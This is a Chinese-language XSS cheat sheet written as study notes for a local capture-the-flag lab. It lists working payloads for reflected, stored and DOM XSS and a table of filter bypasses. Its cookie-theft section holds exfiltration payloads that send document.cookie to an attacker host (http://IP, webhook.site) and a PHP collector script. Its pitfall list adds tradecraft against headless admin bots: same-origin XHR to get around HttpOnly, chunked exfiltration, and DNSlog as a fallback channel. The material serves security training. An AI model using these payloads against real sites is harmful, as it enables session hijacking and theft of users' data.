# XSS 速查 v2（照着做就能把题做完）

> 用法：做题不记得了 → 翻到对应知识点 → 照着 payload 改
> 验证标注：✓(YYYY-MM-DD)=当日靶场实弹；未标注 = 课程实弹(2026-08-28 xs1~xs7 全通)或教材知识
> 靶场：http://localhost:8084/（xs1 反射 / xs2 存储 / xs3 DOM / xs4 偷Cookie / xs5 过滤 / xs6 打管理员 / xs7 裸子串毕业考）
> payload 走 URL 时遵守编码规则：`+`→%2B、`&`→%26、空格→%20、`#`→%23（+ 号三态见 SQL 表 2.4；CMD 引号规则见黑盒开局 第 3 节）
> 2026-08-30 v2 对齐：头图例/靶场端口/坑清单 +5 条实战坑（见第 7 节 8~12 条）

========================================================
## 0. 拿到题先走这个流程
========================================================

```
1. 读源码/看页面：输入（参数/留言/URL）有没有被原样输出到 HTML？
   - 找输出点：echo / <?=  / innerHTML / document.write
   - 看有没有过滤：htmlspecialchars / str_replace / preg_replace
2. 注入 payload 试弹窗（先试 <script>alert(1)</script>，不行试 img onerror）
3. 判断类型（关键！看 payload 藏哪、经不经过服务器）：
   - 刷新还在弹 / 别人访问也弹 → 存储型（进了服务器存储）
   - 只有点链接弹、改 URL 就弹 → 反射型（在 URL 参数里）
   - F12 看是 JS 动态拼的、payload 在 # 后面 → DOM 型（不过服务器）
4. 拿 flag：通常是偷 Cookie（前提：没 HttpOnly）→ 查攻击者服务器记录
5. 被过滤 → 查第 4 节绕过
```

========================================================
## 1. 基础 payload（先试这些）
========================================================

```html
<script>alert(1)</script>              <!-- 最基础（页面加载即执行） -->
<img src=x onerror=alert(1)>           <!-- 图片加载失败触发（最常用） -->
<svg onload=alert(1)>                  <!-- svg 加载触发 -->
<a href="javascript:alert(1)">点我</a>  <!-- 链接点击触发（需要用户点） -->
<input onfocus=alert(1) autofocus>     <!-- 自动聚焦触发（无需交互，onfocus+autofocus 组合） -->
<iframe src="javascript:alert(1)">    <!-- iframe 版 -->
```

**弹窗函数三兄弟**：`alert(1)` / `confirm(1)` / `prompt(1)`
- alert 被过滤时换 confirm/prompt
- ⚠️ Chrome 规定 confirm/prompt 需要"用户手势"才弹（script 自动执行时不弹）
- ⚠️ 实测：Firefox 里 confirm 在 script/onerror 里能弹 → **以自己环境实测为准**

========================================================
## 2. 三类型（先判断是哪种，决定 payload 放哪）
========================================================

| 类型 | payload 藏在哪 | 经过服务器吗 | 谁触发 | 识别方法 |
|------|--------------|------------|--------|---------|
| 反射型 | URL 参数 `?q=` | ✅ 经过（服务器 echo） | 点恶意链接的人 | 改 URL 参数就弹 |
| 存储型 | 服务器（数据库/文件） | ✅ 经过（存了再输出） | 任何访问页面的人 | 输入永久留下，刷新还在 |
| DOM 型 | URL 的 `#` 后面 | ❌ 不经过（纯前端） | 点链接且浏览器执行 JS | F12 看 JS 用 innerHTML 拼 location.hash |

**记忆锚点**：DOM 型 = 服务器日志查不到 payload（根本没发过去）；存储型最危险 = 能打管理员（管理员看后台也中招）。

### 反射型
```url
http://localhost:8084/xs1/?q=<script>alert(1)</script>
```
✓(2026-08-30 复验)：payload 原样出现在响应里 = 反射点确认

### 存储型
```html
留言板/昵称/评论提交：<script>alert(1)</script>
```
**验证持久化**：提交后关掉页面重新打开 → 还弹 = 存进服务器了

### DOM 型
```url
http://localhost:8084/xs3/#<img src=x onerror=alert(1)>
```
⚠️ **关键坑**：innerHTML 塞 `<script>` 标签**不会执行**（HTML5 规范）！DOM 型必须用**事件型**（img onerror / input onfocus / svg onload）

========================================================
## 3. 偷 Cookie（拿 flag 的主要手段）
========================================================

**前提**：Cookie 没有 HttpOnly
- 验证：页面 Console 敲 `document.cookie`，能读到 = 没 HttpOnly
- 或 F12 → Storage/Application → Cookies → 看 HttpOnly 列
- 或看源码 `setcookie()` 第 7 个参数（没写 = 没设）

**完整攻击链（打管理员通用）**：
```
① 构造外带 payload（new Image 无痕外带：页面无感知）
② 触发：反射=骗受害者点链接；存储=管理员看留言板
③ 攻击者服务器收到 ?c= 参数 → 写入记录文件
④ 查收：访问攻击者服务器记录文件 → 看到 flag
```

**外带 payload 集合**：
```html
<script>new Image().src='/xss/hack.php?c='+document.cookie</script>
<img src=x onerror="new Image().src='/xss/hack.php?c='+document.cookie">
<svg onload=fetch('http://IP/?c='+document.cookie)>
```

**攻击者服务器（hack.php）写法**：
```php
$c = $_GET['c'] ?? '';
if ($c !== '') {
    file_put_contents('记录文件.txt', $c . "\n", FILE_APPEND);
    echo "OK, got: " . htmlspecialchars($c);
}
```

**远程实例没有本机监听条件时**（2026-08-30 实战）：收集器换 webhook.site（建器/收数见坑清单第 11 条），payload 里的 `/xss/hack.php?c=` 换成 `https://webhook.site/<uuid>?c=`；bot 场景带 HttpOnly 时按坑清单第 10 条走"bot 自己发同源 XHR 外带响应"。

========================================================
## 4. 过滤绕过速查
========================================================

| 被拦 | 绕过 | 例子 |
|------|------|------|
| <script> 标签 | 换标签 + 事件 | <img src=x onerror=alert(1)> |
| <script> 标签 | 大小写 | <ScRiPt>alert(1)</sCrIpT> |
| 删"带尖括号的 <script>"（单次） | 嵌套双写 | <scr<script>ipt>alert(1)</scr</script>ipt> |
| 删"裸子串 script"（单次） | 重叠双写 | <scscriptript>alert(1)</scscriptript> |
| alert | 换函数 | confirm(1) / prompt(1) |
| onerror | 换事件 | onclick / onfocus+autofocus / onmouseover / onbegin / ontoggle |
| 尖括号全禁 | 找属性注入点（引号闭合） | " onfocus=alert(1) x=" |
| 空格 | / 或 /**/ 或 tab 或 换行 | <img/src=x/onerror=alert(1)> |
| 关键字 | HTML 实体编码 | <img src=x onerror=&#97;lert(1)> |
| 脚本被禁 | javascript: 协议 | <a href=javascript:alert(1)> |

**⚠️ 双写嵌套 vs 重叠（今天实测的区别，必考）**：
- 过滤删**带尖括号的 `<script>`** → 嵌套有效：`<scr<script>ipt>` 删掉中间 → 拼回 `<script>`
- 过滤删**裸子串 `script`** → 嵌套**失效**（删完剩 `<scr<>ipt>`）；要用**重叠**：`<scscriptript>` 删中间 → 拼回 `<script>`
- 过滤**只执行一次**（str_replace 单次）→ 双写有效；**循环过滤**（while）→ 双写死

**自动触发事件**（无需用户交互）：onerror（加载失败）/ onload / onfocus+autofocus / onbegin（SVG动画）/ ontoggle（details 展开）

========================================================
## 5. 读源码找漏洞点（PHP）
========================================================

| 漏洞代码 | 说明 |
|----------|------|
| echo $_GET['q'] / <?= $q ?> | 反射型（原样输出） |
| 留言存文件/库，输出时原样 echo | 存储型 |
| innerHTML = location.hash.substring(1) | DOM 型（前端代码里） |
| 输出前没有 htmlspecialchars() | 没转义 = 漏洞 |
| setcookie() 没第 7 个参数 | 没 HttpOnly = Cookie 可偷 |

**DOM 型陷阱**：源码只有 `location.hash.substring(1)` 没有 `decodeURIComponent` → 浏览器把 # 后的尖括号编码后不弹（需手动编码 %3C %3E 或用 JS 赋值触发）。真实靶场通常有 decodeURIComponent。

========================================================
## 6. 防御（面试）
========================================================

1. 输出转义 htmlspecialchars()（根本方案）
2. HttpOnly Cookie（防偷 Cookie）
3. CSP 限制脚本来源（纵深防御）
4. 富文本场景：白名单标签 + 禁 on* 事件

========================================================
## 7. 坑清单（实测踩过的，做题先看这个）
========================================================

1. **innerHTML 不执行 `<script>`** → DOM 型用事件型（img onerror 等）
2. **URL 查询参数里 `+` = 空格** → 要传真正的加号用 `%2B`（外带 payload 必踩）
3. **地址栏粘尖括号 URL 会被当搜索词** → 先手动编码：`<`→%3C `>`→%3E 空格→%20
4. **裸子串过滤下嵌套双写死、重叠双写活**（见第 4 节）
5. **confirm/prompt 在 Chrome 需要用户手势，Firefox 实测能弹** → 以环境实测为准，alert 被过滤优先试 confirm
6. **容器重建会清数据**（留言/记录文件全没）→ 重建后重打
7. **DOM 型 payload 在 # 后面** → 不发给服务器，服务器日志查不到
8. **JS 字符串里出现字面 `</script>` 会提前终止整个脚本块**（2026-08-30 实战：外带载荷整段失活、零报错）→ 字符串里写 `<\/script>`，收尾的 `</script>` 只留真收尾
9. **无头 bot 不一定有 fetch/Promise**（2026-08-30 实战：PhantomJS/2.0.0 两者皆无，fetch 版载荷第一行就死）→ 先发一发 `new Image().src='收集器?tag=HELLO'` 确认执行环境，正式载荷用 XMLHttpRequest + new Image 兜底，分块外带防 URL 超长
10. **bot 的 cookie 带 HttpOnly 时 document.cookie 偷不到 sessionid** → 让 bot 自己以它的会话发同源 XHR（cookie 自动附带）打目标接口，把响应内容外带回来
11. **打远程实例（无本机监听条件）用 webhook.site 当收集器**：POST /token 建收集器 → payload 外带到 https://webhook.site/<uuid> → GET /token/<uuid>/requests 收数据，DNSlog.cn 是备用信道（HTTP 被墙时 DNS 解析常能过）
12. **Django DEBUG=True 的 404 页会泄全部 URL 路由** → 黑盒第一步先随便访问一个不存在的路径看路由表

## 心法

> 输入被原样输出就是 XSS ｜ 先试 <script> 再试 img onerror ｜ 偷 Cookie 看 HttpOnly ｜ 拦什么换什么 ｜ URL 里特殊字符要编码 ｜ innerHTML 不吃 script
